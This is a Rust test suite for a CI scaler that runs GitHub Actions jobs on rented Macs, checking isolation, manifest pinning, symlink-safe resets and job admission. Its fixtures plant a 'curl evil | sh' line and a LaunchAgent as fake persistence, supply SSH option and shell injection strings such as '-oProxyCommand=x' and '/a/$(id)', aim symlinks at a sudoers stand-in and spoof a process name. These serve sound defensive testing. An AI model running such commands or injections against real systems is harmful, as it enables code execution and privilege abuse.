#![allow(clippy::unwrap_used, clippy::expect_used)]
use carrick_xtask::ci_scaler::*;
use std::os::unix::fs::PermissionsExt;

fn job(id: u64) -> JobKey {
    JobKey {
        run: RunId(10),
        attempt: 1,
        job: JobId(id),
    }
}

#[test]
fn mac_ledger_serves_one_runner_and_each_job_attempt_once() {
    let mut ledger = MacLedger::default();
    let mut row = ledger.reserve(job(1), 100).unwrap();
    assert_eq!(row.name, "carrick-hvf-10-1-1-100");
    assert_eq!(row.state, MacState::Registering);
    assert!(ledger.reserve(job(2), 101).is_err(), "one runner at a time");
    row.state = MacState::Done;
    row.assigned = Some(JobId(1));
    ledger.rows[0] = row;
    assert!(ledger.reserve(job(1), 102).is_err(), "job key deduplicated");
    let restored: MacLedger =
        serde_json::from_slice(&serde_json::to_vec(&ledger).unwrap()).unwrap();
    let mut restored = restored;
    assert!(restored.reserve(job(2), 103).is_ok());
}

#[test]
fn mac_ledger_re_serves_a_job_whose_runner_never_ran_it() {
    let mut ledger = MacLedger::default();
    let row = ledger.reserve(job(1), 100).unwrap();
    // Launch failed or the runner was drained/killed: closed without the job.
    ledger.rows[0].state = MacState::Done;
    assert!(ledger.reserve(job(1), 101).is_ok());
    assert_ne!(ledger.rows[1].name, row.name);
}

fn launched(created: u64) -> MacRecord {
    let mut row = MacLedger::default().reserve(job(1), created).unwrap();
    row.state = MacState::Launched;
    row.runner = Some(RunnerId(7));
    row
}

#[test]
fn mac_step_never_removes_a_busy_runner_and_drains_only_after_the_deadline() {
    let row = launched(1000);
    for done in [false, true] {
        assert_eq!(
            mac_step(&row, Assignment::Busy, done, 99_999),
            MacStep::Wait
        );
    }
    assert_eq!(
        mac_step(&row, Assignment::Unassigned, false, 1000 + 899),
        MacStep::Wait
    );
    assert_eq!(
        mac_step(&row, Assignment::Unassigned, false, 1000 + 900),
        MacStep::Drain
    );
    // Runner process gone without a job: rejected and killed, or failed.
    assert_eq!(
        mac_step(&row, Assignment::Unassigned, true, 1001),
        MacStep::Remove
    );
    // Completed: let the ephemeral runner exit before removing it.
    assert_eq!(
        mac_step(&row, Assignment::Completed, false, 1001),
        MacStep::Wait
    );
    assert_eq!(
        mac_step(&row, Assignment::Completed, true, 1001),
        MacStep::Remove
    );
    assert_eq!(
        mac_step(&row, Assignment::Unknown, false, 99_999),
        MacStep::Wait
    );
    let mut interrupted = row.clone();
    interrupted.state = MacState::Registering;
    assert_eq!(
        mac_step(&interrupted, Assignment::Unknown, true, 1001),
        MacStep::Remove
    );
    let mut draining = row;
    draining.state = MacState::Draining;
    assert_eq!(
        mac_step(&draining, Assignment::Unassigned, false, 1001),
        MacStep::Drain
    );
}

#[test]
fn mac_target_sudo_command_carries_only_the_binding_and_pin() {
    let pin = "a".repeat(64);
    let target = MacTarget::new(
        "rentamac@cloudmac".into(),
        "/Volumes/carrick-build/carrick-ci/bin/carrick-xtask".into(),
        pin.clone(),
    )
    .unwrap();
    let command = target.run_once_command("carrick-hvf-10-1-1-100", &binding());
    assert!(command.starts_with(
        "sudo -n '/Volumes/carrick-build/carrick-ci/bin/carrick-xtask' ci-scaler mac-run-once"
    ));
    assert!(command.contains(&format!(
        "--run-id 10 --run-attempt 1 --sha '{}'",
        "f".repeat(40)
    )));
    assert!(command.ends_with(&pin));
    assert!(!command.contains("jit"));
    assert!(
        target
            .quiesce_command("carrick-hvf-10-1-1-100")
            .starts_with("sudo -n ")
    );
    assert!(MacTarget::new("h".into(), "/a/b".into(), "short".into()).is_err());
}

#[test]
fn mac_target_rejects_option_and_shell_injection() {
    let ok = |host: &str, xtask: &str, _unused: &str| {
        MacTarget::new(host.into(), xtask.into(), "a".repeat(64)).is_ok()
    };
    assert!(ok(
        "rentamac@cloudmac",
        "/Volumes/carrick-build/carrick-ci/bin/carrick-xtask",
        "/Volumes/carrick-build/carrick-ci/run"
    ));
    assert!(!ok("-oProxyCommand=x", "/a/b", "/a/c"));
    assert!(!ok("host;rm", "/a/b", "/a/c"));
    assert!(!ok("host", "relative/xtask", "/a/c"));
    assert!(!ok("host", "/a/b c", "/a/c"));
    assert!(!ok("host", "/a/../b", "/a/c"));
    assert!(!ok("host", "/a/$(id)", "/a/c"));
}

fn binding() -> RunBinding {
    RunBinding {
        run: RunId(10),
        attempt: 1,
        sha: "f".repeat(40),
    }
}

/// A state root and hook executable owned by the test user, standing in for
/// root ownership (production passes owner 0).
fn fixture() -> (tempfile::TempDir, std::path::PathBuf, u32) {
    let root = tempfile::tempdir().unwrap();
    std::fs::set_permissions(root.path(), std::fs::Permissions::from_mode(0o755)).unwrap();
    let exe = root.path().join("xtask");
    std::fs::write(&exe, "#!/bin/sh\n").unwrap();
    std::fs::set_permissions(&exe, std::fs::Permissions::from_mode(0o755)).unwrap();
    let state_root = root.path().join("run");
    std::fs::create_dir(&state_root).unwrap();
    std::fs::set_permissions(&state_root, std::fs::Permissions::from_mode(0o755)).unwrap();
    (root, exe, unsafe { libc::geteuid() })
}

#[test]
fn run_once_state_is_one_use_and_bound_to_the_vetted_run() {
    let (root, exe, uid) = fixture();
    let state_root = root.path().join("run");
    let name = "carrick-hvf-10-1-1-100";
    let state = prepare_run_once(name, &exe, &state_root, &binding(), uid, uid).unwrap();
    assert_eq!(
        read_policy(&state.join("policy"), Some(uid)).unwrap(),
        JobPolicy::Bound(binding())
    );
    let mode = |file: &str| {
        std::fs::metadata(state.join(file))
            .unwrap()
            .permissions()
            .mode()
            & 0o777
    };
    assert_eq!(mode("policy"), 0o644);
    assert_eq!(mode("admit-job.sh"), 0o755);
    assert_eq!(mode("admission.lock"), 0o600);
    let hook = std::fs::read_to_string(state.join("admit-job.sh")).unwrap();
    assert!(hook.contains("ci-scaler admit-job --policy-file"));
    assert!(hook.contains("exec /bin/kill -KILL 0"));
    assert!(!hook.contains("/usr/local/bin/carrick-xtask"));
    // Replaying a name loses at mkdir.
    assert!(prepare_run_once(name, &exe, &state_root, &binding(), uid, uid).is_err());
    // Only mac-jit names; never a path.
    for bad in [
        "../etc",
        "carrick-hvf-",
        "carrick-hvf-1/2",
        "carrick-ci-1-1-1-1",
    ] {
        assert!(
            prepare_run_once(bad, &exe, &state_root, &binding(), uid, uid).is_err(),
            "{bad}"
        );
    }
    let mut short = binding();
    short.sha = "short".into();
    assert!(prepare_run_once("carrick-hvf-1-1-1-9", &exe, &state_root, &short, uid, uid).is_err());
}

#[test]
fn run_once_refuses_a_job_writable_hook_binary_or_state_root() {
    let (root, exe, uid) = fixture();
    let state_root = root.path().join("run");
    // The hook xtask must belong to the policy owner (root in production).
    assert!(
        prepare_run_once(
            "carrick-hvf-1-1-1-1",
            &exe,
            &state_root,
            &binding(),
            uid.wrapping_add(1),
            uid
        )
        .is_err()
    );
    std::fs::set_permissions(&exe, std::fs::Permissions::from_mode(0o775)).unwrap();
    assert!(
        prepare_run_once(
            "carrick-hvf-1-1-1-2",
            &exe,
            &state_root,
            &binding(),
            uid,
            uid
        )
        .is_err()
    );
    std::fs::set_permissions(&exe, std::fs::Permissions::from_mode(0o755)).unwrap();
    std::fs::set_permissions(&state_root, std::fs::Permissions::from_mode(0o777)).unwrap();
    assert!(
        prepare_run_once(
            "carrick-hvf-1-1-1-3",
            &exe,
            &state_root,
            &binding(),
            uid,
            uid
        )
        .is_err()
    );
}

fn sha256_hex(bytes: &[u8]) -> String {
    use sha2::{Digest, Sha256};
    format!("{:x}", Sha256::digest(bytes))
}

#[test]
fn runner_tree_must_match_the_pinned_manifest_before_every_launch() {
    let tree = tempfile::tempdir().unwrap();
    let uid = unsafe { libc::geteuid() };
    let dir = tree.path().join("actions-runner");
    std::fs::create_dir_all(dir.join("bin")).unwrap();
    std::fs::create_dir_all(dir.join("_work/job")).unwrap();
    std::fs::create_dir_all(dir.join("_diag")).unwrap();
    std::fs::write(dir.join("run.sh"), "#!/bin/sh\n").unwrap();
    std::fs::write(dir.join("bin/Runner.Listener"), "listener").unwrap();
    std::os::unix::fs::symlink("Runner.Listener", dir.join("bin/listener")).unwrap();
    for path in [dir.clone(), dir.join("bin")] {
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755)).unwrap();
    }
    for file in ["run.sh", "bin/Runner.Listener"] {
        std::fs::set_permissions(dir.join(file), std::fs::Permissions::from_mode(0o755)).unwrap();
    }
    let manifest_text = runner_manifest_for(&dir, Some(uid)).unwrap();
    assert!(manifest_text.contains("link Runner.Listener bin/listener"));
    assert!(
        !manifest_text.contains("_work"),
        "runner-writable dirs are excluded"
    );
    let manifest = tree.path().join("runner-manifest.txt");
    std::fs::write(&manifest, &manifest_text).unwrap();
    std::fs::set_permissions(&manifest, std::fs::Permissions::from_mode(0o644)).unwrap();
    let pin = sha256_hex(manifest_text.as_bytes());
    verify_runner_tree(&dir, &manifest, &pin, Some(uid)).unwrap();
    // Job output in _work does not matter.
    std::fs::write(dir.join("_work/job/out"), "x").unwrap();
    verify_runner_tree(&dir, &manifest, &pin, Some(uid)).unwrap();
    // A different pin, a modified file, a mode change, an extra file: refused.
    assert!(verify_runner_tree(&dir, &manifest, &"0".repeat(64), Some(uid)).is_err());
    std::fs::write(dir.join("run.sh"), "#!/bin/sh\nexit 0\n").unwrap();
    assert!(verify_runner_tree(&dir, &manifest, &pin, Some(uid)).is_err());
    std::fs::write(dir.join("run.sh"), "#!/bin/sh\n").unwrap();
    verify_runner_tree(&dir, &manifest, &pin, Some(uid)).unwrap();
    std::fs::set_permissions(dir.join("run.sh"), std::fs::Permissions::from_mode(0o775)).unwrap();
    assert!(verify_runner_tree(&dir, &manifest, &pin, Some(uid)).is_err());
    std::fs::set_permissions(dir.join("run.sh"), std::fs::Permissions::from_mode(0o755)).unwrap();
    std::fs::write(dir.join("bin/extra"), "x").unwrap();
    std::fs::set_permissions(
        dir.join("bin/extra"),
        std::fs::Permissions::from_mode(0o644),
    )
    .unwrap();
    assert!(verify_runner_tree(&dir, &manifest, &pin, Some(uid)).is_err());
    std::fs::remove_file(dir.join("bin/extra")).unwrap();
    // Another owner (root in production) is refused.
    assert!(verify_runner_tree(&dir, &manifest, &pin, Some(uid.wrapping_add(1))).is_err());
}

#[test]
fn scheduler_deny_lists_must_name_the_runner_account_exactly() {
    assert!(denies_user("root\ncarrick-ci\n", "carrick-ci"));
    assert!(denies_user("  carrick-ci  \n", "carrick-ci"));
    assert!(!denies_user(
        "carrick-ci-other\n# carrick-ci\n",
        "carrick-ci"
    ));
    assert!(!denies_user("", "carrick-ci"));
}

#[test]
fn job_home_and_work_are_recreated_from_the_skeleton_before_every_job() {
    let root = tempfile::tempdir().unwrap();
    std::fs::set_permissions(root.path(), std::fs::Permissions::from_mode(0o755)).unwrap();
    let uid = unsafe { libc::geteuid() };
    let gid = unsafe { libc::getegid() };
    let skel = root.path().join("skel");
    std::fs::create_dir_all(skel.join(".config")).unwrap();
    std::fs::write(skel.join(".zshrc"), "export SKEL=1\n").unwrap();
    std::fs::write(skel.join(".config/git"), "[core]\n").unwrap();
    std::fs::set_permissions(&skel, std::fs::Permissions::from_mode(0o755)).unwrap();
    let home = root.path().join("home");
    let work = root.path().join("_work");
    let diag = root.path().join("_diag");
    // A previous job left persistence and caches behind.
    std::fs::create_dir_all(home.join("Library/LaunchAgents")).unwrap();
    std::fs::write(home.join("Library/LaunchAgents/evil.plist"), "x").unwrap();
    std::fs::write(home.join(".zshrc"), "curl evil | sh\n").unwrap();
    std::fs::create_dir_all(work.join("old/target")).unwrap();
    std::fs::write(work.join("old/target/cache"), "x").unwrap();
    // A symlink planted in place of a work dir is removed, never followed.
    let outside = root.path().join("outside");
    std::fs::create_dir(&outside).unwrap();
    std::fs::write(outside.join("keep"), "x").unwrap();
    std::os::unix::fs::symlink(&outside, &diag).unwrap();
    reset_job_area(&skel, &home, &[work.clone(), diag.clone()], uid, uid, gid).unwrap();
    assert_eq!(
        std::fs::read_to_string(home.join(".zshrc")).unwrap(),
        "export SKEL=1\n"
    );
    assert!(home.join(".config/git").is_file());
    assert!(!home.join("Library").exists());
    assert_eq!(std::fs::read_dir(&work).unwrap().count(), 0);
    assert!(std::fs::symlink_metadata(&diag).unwrap().is_dir());
    assert!(outside.join("keep").exists(), "symlink target untouched");
    // A skeleton the runner account could write is refused.
    std::fs::set_permissions(&skel, std::fs::Permissions::from_mode(0o777)).unwrap();
    assert!(reset_job_area(&skel, &home, &[], uid, uid, gid).is_err());
}

#[test]
fn toolchain_must_be_owner_only() {
    let root = tempfile::tempdir().unwrap();
    let uid = unsafe { libc::geteuid() };
    let tool = root.path().join("toolchain");
    std::fs::create_dir_all(tool.join("rustup")).unwrap();
    std::fs::create_dir_all(tool.join("cargo/bin")).unwrap();
    for dir in [tool.clone(), tool.join("rustup"), tool.join("cargo/bin")] {
        std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o755)).unwrap();
    }
    verify_toolchain(&tool, uid).unwrap();
    assert!(verify_toolchain(&tool, uid.wrapping_add(1)).is_err());
    std::fs::set_permissions(
        tool.join("cargo/bin"),
        std::fs::Permissions::from_mode(0o777),
    )
    .unwrap();
    assert!(verify_toolchain(&tool, uid).is_err());
}

#[test]
fn reset_never_writes_through_a_symlink_planted_in_the_job_home() {
    let root = tempfile::tempdir().unwrap();
    std::fs::set_permissions(root.path(), std::fs::Permissions::from_mode(0o755)).unwrap();
    let uid = unsafe { libc::geteuid() };
    let gid = unsafe { libc::getegid() };
    let skel = root.path().join("skel");
    std::fs::create_dir_all(skel.join(".ssh")).unwrap();
    std::fs::write(skel.join(".zshrc"), "export SKEL=1\n").unwrap();
    std::fs::write(skel.join(".ssh/config"), "Host *\n").unwrap();
    std::fs::set_permissions(&skel, std::fs::Permissions::from_mode(0o755)).unwrap();
    // Stand-ins for /etc/sudoers.d/x and a root-owned directory.
    let outside = root.path().join("outside");
    std::fs::create_dir(&outside).unwrap();
    std::fs::write(outside.join("sudoers"), "original\n").unwrap();
    let home = root.path().join("home");
    std::fs::create_dir(&home).unwrap();
    std::os::unix::fs::symlink(outside.join("sudoers"), home.join(".zshrc")).unwrap();
    std::os::unix::fs::symlink(&outside, home.join(".ssh")).unwrap();
    // Also pre-plant the temporary build name as a symlink to a directory.
    std::os::unix::fs::symlink(&outside, root.path().join(".home.new")).unwrap();
    reset_job_area(&skel, &home, &[], uid, uid, gid).unwrap();
    assert_eq!(
        std::fs::read_to_string(outside.join("sudoers")).unwrap(),
        "original\n",
        "a root write went through a planted symlink"
    );
    assert_eq!(
        std::fs::read_dir(&outside).unwrap().count(),
        1,
        "nothing was created in the symlink target"
    );
    let zshrc = std::fs::symlink_metadata(home.join(".zshrc")).unwrap();
    assert!(zshrc.is_file());
    assert_eq!(
        std::fs::read_to_string(home.join(".zshrc")).unwrap(),
        "export SKEL=1\n"
    );
    assert!(
        std::fs::symlink_metadata(home.join(".ssh"))
            .unwrap()
            .is_dir()
    );
    assert!(!root.path().join(".home.new").exists());
    assert!(!root.path().join(".home.old").exists());
    // The home itself replaced by a symlink is swapped out, not followed.
    std::fs::remove_dir_all(&home).unwrap();
    std::os::unix::fs::symlink(&outside, &home).unwrap();
    reset_job_area(&skel, &home, &[], uid, uid, gid).unwrap();
    assert!(std::fs::symlink_metadata(&home).unwrap().is_dir());
    assert_eq!(std::fs::read_dir(&outside).unwrap().count(), 1);
}

#[test]
fn exempt_agents_are_real_root_owned_apple_paths_with_launchd_parent() {
    for agent in EXEMPT_AGENTS {
        assert!(
            agent.starts_with("/usr/sbin/") || agent.starts_with("/usr/libexec/"),
            "{agent}"
        );
    }
    // A real-path match of a root-owned, non-writable binary under launchd.
    let real = std::path::Path::new("/bin/sleep");
    assert!(exempt_agent(Some(real), 1, &["/bin/sleep"]));
    // Not launchd's child, unknown path, or no path: not exempt.
    assert!(!exempt_agent(Some(real), 4242, &["/bin/sleep"]));
    assert!(!exempt_agent(Some(real), 1, &EXEMPT_AGENTS));
    assert!(!exempt_agent(None, 1, &["/bin/sleep"]));
    // A look-alike copy the job owns, even if someone allowlisted its path.
    let dir = tempfile::tempdir().unwrap();
    let copy = dir.path().join("distnoted");
    std::fs::copy(real, &copy).unwrap();
    let copy_text = copy.to_str().unwrap();
    if unsafe { libc::geteuid() } != 0 {
        assert!(!exempt_agent(Some(&copy), 1, &[copy_text]));
    }
}

#[cfg(target_os = "macos")]
#[test]
fn serial_host_argv_spoofed_process_is_classified_by_its_real_path() {
    use std::os::unix::process::CommandExt;
    let mut child = std::process::Command::new("/bin/sleep")
        .arg0("/usr/sbin/distnoted")
        .arg("30")
        .spawn()
        .unwrap();
    let pid = i32::try_from(child.id()).unwrap();
    let facts = process_facts(pid);
    let _ = child.kill();
    let _ = child.wait();
    let facts = facts.expect("own child is inspectable");
    assert_eq!(
        facts.path.as_deref(),
        Some(std::path::Path::new("/bin/sleep"))
    );
    assert_eq!(facts.uid, unsafe { libc::geteuid() });
    // argv says distnoted; the kernel path does not. Even a forged launchd
    // parent would not exempt it.
    assert!(!exempt_agent(
        facts.path.as_deref(),
        facts.ppid,
        &EXEMPT_AGENTS
    ));
    assert!(!exempt_agent(facts.path.as_deref(), 1, &EXEMPT_AGENTS));
}

#[cfg(target_os = "macos")]
#[test]
fn a_live_distnoted_agent_if_present_is_exempt_by_real_path() {
    // Read-only: classify any running distnoted agent owned by launchd.
    let output = std::process::Command::new("/usr/bin/pgrep")
        .args(["-x", "distnoted"])
        .output()
        .unwrap();
    for pid in String::from_utf8_lossy(&output.stdout)
        .lines()
        .filter_map(|l| l.trim().parse::<i32>().ok())
    {
        if let Some(facts) = process_facts(pid)
            && facts.ppid == 1
            && facts.path.is_some()
        {
            assert!(exempt_agent(
                facts.path.as_deref(),
                facts.ppid,
                &EXEMPT_AGENTS
            ));
        }
    }
}

#[test]
fn runner_is_launched_through_the_listener_not_run_sh() {
    let command = listener_command(std::path::Path::new("/runner"));
    assert_eq!(
        command.get_program(),
        std::path::Path::new("/runner/bin/Runner.Listener")
    );
    let args: Vec<_> = command.get_args().collect();
    assert_eq!(args, ["run"]);
}

#[cfg(target_os = "macos")]
fn runner_fixture(base: &std::path::Path) -> std::path::PathBuf {
    let dir = base.join("actions-runner");
    std::fs::create_dir_all(dir.join("bin")).unwrap();
    std::fs::create_dir_all(dir.join("externals")).unwrap();
    std::fs::write(dir.join("bin/Runner.Listener"), "listener").unwrap();
    std::fs::write(dir.join("externals/node"), "node").unwrap();
    for d in [".", "bin", "externals"] {
        std::fs::set_permissions(dir.join(d), std::fs::Permissions::from_mode(0o755)).unwrap();
    }
    for f in ["bin/Runner.Listener", "externals/node"] {
        std::fs::set_permissions(dir.join(f), std::fs::Permissions::from_mode(0o755)).unwrap();
    }
    dir
}

#[test]
fn run_root_is_private_to_the_run_state_directory() {
    let state = std::path::Path::new("/Volumes/carrick-build/carrick-ci/run/carrick-hvf-1");
    let root = run_root_path(state);
    assert_eq!(root, state.join("runner"));
    assert_ne!(
        root,
        std::path::Path::new("/Volumes/carrick-build/actions-runner")
    );
    assert!(root.starts_with(state));
}

#[cfg(target_os = "macos")]
#[test]
fn clone_is_handed_over_at_the_root_only_and_refuses_tampered_bin() {
    use std::os::unix::fs::MetadataExt;
    let tmp = tempfile::tempdir().unwrap();
    let uid = unsafe { libc::geteuid() };
    let gid = unsafe { libc::getegid() };
    let shared = runner_fixture(tmp.path());
    // Stale writable dirs in the shared tree must not leak into the clone.
    std::fs::create_dir_all(shared.join("_work/old")).unwrap();
    let manifest_text = runner_manifest_for(&shared, Some(uid)).unwrap();
    let manifest = tmp.path().join("manifest.txt");
    std::fs::write(&manifest, &manifest_text).unwrap();
    std::fs::set_permissions(&manifest, std::fs::Permissions::from_mode(0o644)).unwrap();
    let pin = sha256_hex(manifest_text.as_bytes());

    let state = tmp.path().join("run-1");
    std::fs::create_dir(&state).unwrap();
    let clone = run_root_path(&state);
    clone_runner_tree(&shared, &clone).unwrap();
    assert!(clone_runner_tree(&shared, &clone).is_err(), "no overwrite");
    verify_runner_tree(&clone, &manifest, &pin, Some(uid)).unwrap();

    // The clone is private: writing it never touches the shared tree.
    std::fs::set_permissions(
        clone.join("bin/Runner.Listener"),
        std::fs::Permissions::from_mode(0o755),
    )
    .unwrap();
    std::fs::write(clone.join("bin/Runner.Listener"), "evil").unwrap();
    assert!(verify_runner_tree(&clone, &manifest, &pin, Some(uid)).is_err());
    assert_eq!(
        std::fs::read(shared.join("bin/Runner.Listener")).unwrap(),
        b"listener"
    );
    verify_runner_tree(&shared, &manifest, &pin, Some(uid)).unwrap();
    std::fs::write(clone.join("bin/Runner.Listener"), "listener").unwrap();
    verify_runner_tree(&clone, &manifest, &pin, Some(uid)).unwrap();

    hand_clone_to_run_user(&clone, uid, gid).unwrap();
    let mode = |p: &str| {
        std::fs::metadata(clone.join(p))
            .unwrap()
            .permissions()
            .mode()
            & 0o7777
    };
    assert_eq!(std::fs::metadata(&clone).unwrap().uid(), uid);
    assert_eq!(mode("."), 0o755, "root dir: listener writes dot-files");
    assert_eq!(mode("bin") & 0o022, 0, "bin not group/other writable");
    assert_eq!(mode("externals") & 0o022, 0);
    assert_eq!(mode("_work"), 0o700);
    assert_eq!(mode("_diag"), 0o700);
    assert!(
        !clone.join("_work/old").exists(),
        "cloned job output discarded"
    );
    // Handing over does not change what the manifest covers.
    verify_runner_tree(&clone, &manifest, &pin, Some(uid)).unwrap();
}

#[cfg(target_os = "macos")]
#[test]
fn removing_the_run_root_does_not_follow_planted_symlinks() {
    let tmp = tempfile::tempdir().unwrap();
    let shared = runner_fixture(tmp.path());
    let outside = tmp.path().join("outside");
    std::fs::create_dir_all(&outside).unwrap();
    std::fs::write(outside.join("keep"), "x").unwrap();
    let clone = tmp.path().join("clone");
    clone_runner_tree(&shared, &clone).unwrap();
    std::os::unix::fs::symlink(&outside, clone.join("planted")).unwrap();
    std::os::unix::fs::symlink(outside.join("keep"), clone.join(".runner")).unwrap();
    remove_run_root(&clone).unwrap();
    assert!(std::fs::symlink_metadata(&clone).is_err());
    assert!(outside.join("keep").exists());
    assert!(shared.join("bin/Runner.Listener").exists());
    remove_run_root(&clone).unwrap();
}

#[test]
fn job_env_gives_each_run_a_private_sccache_server_and_cache() {
    let mut command = std::process::Command::new("/usr/bin/env");
    // Anything the launcher inherited or set earlier must not survive.
    command
        .env("SCCACHE_BUCKET", "leaked")
        .env("SCCACHE_SERVER_PORT", "4226")
        .env("SCCACHE_DIR", "/Volumes/carrick/dev/.sccache");
    apply_job_env(&mut command, std::path::Path::new("/state/run"));
    let out = command.output().unwrap();
    let env: std::collections::BTreeMap<String, String> = String::from_utf8(out.stdout)
        .unwrap()
        .lines()
        .filter_map(|l| l.split_once('=').map(|(k, v)| (k.to_owned(), v.to_owned())))
        .collect();
    let uds = &env["SCCACHE_SERVER_UDS"];
    assert!(
        std::path::Path::new(uds).starts_with(JOB_HOME),
        "socket must live in the wiped job home: {uds}"
    );
    assert!(uds.len() < 104, "sun_path limit on macOS");
    assert_eq!(env["SCCACHE_DIR"], SCCACHE_DIR);
    assert_eq!(env["SCCACHE_CACHE_SIZE"], "8G");
    assert_eq!(SCCACHE_CACHE_SIZE, "8G");
    assert!(!env.contains_key("SCCACHE_BUCKET"));
    assert!(!env.contains_key("SCCACHE_SERVER_PORT"));
    let mut sccache: Vec<&str> = env
        .keys()
        .filter(|k| k.starts_with("SCCACHE_"))
        .map(String::as_str)
        .collect();
    sccache.sort_unstable();
    assert_eq!(
        sccache,
        ["SCCACHE_CACHE_SIZE", "SCCACHE_DIR", "SCCACHE_SERVER_UDS"]
    );
}

#[test]
fn run_user_dir_is_private_persistent_and_never_follows_a_symlink() {
    let root = tempfile::tempdir().unwrap();
    let uid = unsafe { libc::geteuid() };
    let gid = unsafe { libc::getegid() };
    let dir = root.path().join("sccache");
    ensure_run_user_dir(&dir, uid, gid).unwrap();
    assert_eq!(
        std::fs::metadata(&dir).unwrap().permissions().mode() & 0o777,
        0o700
    );
    // Cache contents persist across runs.
    std::fs::write(dir.join("entry"), "x").unwrap();
    ensure_run_user_dir(&dir, uid, gid).unwrap();
    assert!(dir.join("entry").exists());
    // A planted symlink is replaced, its target untouched.
    std::fs::remove_dir_all(&dir).unwrap();
    let outside = root.path().join("outside");
    std::fs::create_dir(&outside).unwrap();
    std::fs::write(outside.join("keep"), "x").unwrap();
    std::os::unix::fs::symlink(&outside, &dir).unwrap();
    ensure_run_user_dir(&dir, uid, gid).unwrap();
    assert!(std::fs::symlink_metadata(&dir).unwrap().is_dir());
    assert!(outside.join("keep").exists());
}

#[test]
fn admitted_a_serves_re_vetted_b_but_refuses_untrusted_assignment() {
    let context = JobContext {
        repository: "carrick-sh/carrick".into(),
        event: "push".into(),
        workflow_ref: "carrick-sh/carrick/.github/workflows/kernel-runtime.yml@refs/heads/main"
            .into(),
        git_ref: "refs/heads/main".into(),
        sha: "b".repeat(40),
        run_id: 20,
        run_attempt: 1,
    };
    let (root, exe, uid) = fixture();
    let state = prepare_run_once(
        "carrick-hvf-10-1-1-100",
        &exe,
        &root.path().join("run"),
        &binding(),
        uid,
        uid,
    )
    .unwrap();
    assert!(
        read_policy(&state.join("policy"), Some(uid))
            .unwrap()
            .authorize(&context)
            .is_err()
    );
    let approved = JobPolicy::Bound(RunBinding {
        run: RunId(20),
        attempt: 1,
        sha: context.sha.clone(),
    });
    let hook_state = state.clone();
    let hook_context = context.clone();
    let hook = std::thread::spawn(move || {
        admit_assigned(
            &hook_state,
            &hook_context,
            uid,
            std::time::Duration::from_secs(5),
        )
    });
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(5);
    while pending_assignment(&state).unwrap().is_none() {
        assert!(
            std::time::Instant::now() < deadline,
            "hook never published its assignment"
        );
        std::thread::yield_now();
    }
    publish_assignment(&state, &approved).unwrap();
    hook.join().unwrap().unwrap();
    publish_assignment(&state, &approved).unwrap(); // restart is idempotent
    assert!(publish_assignment(&state, &JobPolicy::Bound(binding())).is_err());
    assert_eq!(pending_assignment(&state).unwrap().unwrap().run_id, 20);
    let mut untrusted = context.clone();
    untrusted.event = "pull_request".into();
    assert!(admit_assigned(&state, &untrusted, uid, std::time::Duration::ZERO).is_err());
    untrusted = context.clone();
    untrusted.repository = "fork/carrick".into();
    assert!(admit_assigned(&state, &untrusted, uid, std::time::Duration::ZERO).is_err());
    untrusted = context.clone();
    untrusted.sha = "c".repeat(40);
    assert!(admit_assigned(&state, &untrusted, uid, std::time::Duration::ZERO).is_err());
}

#[test]
fn alternate_assignment_is_durable_and_deduplicated_without_consuming_reservation() {
    let mut ledger = MacLedger::default();
    let mut row = ledger.reserve(job(1), 100).unwrap();
    let actual = JobKey {
        run: RunId(20),
        attempt: 2,
        job: JobId(22),
    };
    row.assigned = Some(actual.job);
    row.assigned_key = Some(actual);
    row.state = MacState::Done;
    ledger.rows[0] = row;
    let ledger: MacLedger = serde_json::from_slice(&serde_json::to_vec(&ledger).unwrap()).unwrap();
    assert!(ledger.served(actual));
    assert!(!ledger.served(job(1)), "A remains demand when B ran");
    assert_eq!(ledger.rows[0].assigned_key, Some(actual));
}

#[test]
fn actual_assignment_requires_unique_runner_identity_and_exact_hvf_labels() {
    let context = JobContext {
        repository: "carrick-sh/carrick".into(),
        event: "push".into(),
        workflow_ref: "carrick-sh/carrick/.github/workflows/kernel-runtime.yml@refs/heads/main"
            .into(),
        git_ref: "refs/heads/main".into(),
        sha: "b".repeat(40),
        run_id: 20,
        run_attempt: 2,
    };
    let actual = serde_json::json!({"id":22,"runner_id":100,"labels":HVF_LABELS});
    let key = assigned_job_key(&context, RunnerId(100), std::slice::from_ref(&actual)).unwrap();
    assert_eq!(
        key,
        JobKey {
            run: RunId(20),
            attempt: 2,
            job: JobId(22)
        }
    );
    assert!(assigned_job_key(&context, RunnerId(101), std::slice::from_ref(&actual)).is_err());
    assert!(assigned_job_key(&context, RunnerId(100), &[actual.clone(), actual.clone()]).is_err());
    let mut closure = actual;
    closure["labels"] = serde_json::json!(HVF_CLOSURE_LABELS);
    assert!(assigned_job_key(&context, RunnerId(100), &[closure]).is_err());
}

#[test]
fn assignment_without_approval_or_during_drain_fails_closed() {
    let (root, exe, uid) = fixture();
    let state = prepare_run_once(
        "carrick-hvf-10-1-1-100",
        &exe,
        &root.path().join("run"),
        &binding(),
        uid,
        uid,
    )
    .unwrap();
    let context = JobContext {
        repository: "carrick-sh/carrick".into(),
        event: "push".into(),
        workflow_ref: "carrick-sh/carrick/.github/workflows/kernel-runtime.yml@refs/heads/main"
            .into(),
        git_ref: "refs/heads/main".into(),
        sha: "b".repeat(40),
        run_id: 20,
        run_attempt: 1,
    };
    assert!(admit_assigned(&state, &context, uid, std::time::Duration::ZERO).is_err());
    assert_eq!(quiesce_guest(&state).unwrap(), Assignment::Unassigned);
    assert!(publish_assignment(&state, &JobPolicy::Bound(binding())).is_err());
    assert!(admit_assigned(&state, &context, uid, std::time::Duration::ZERO).is_err());
}
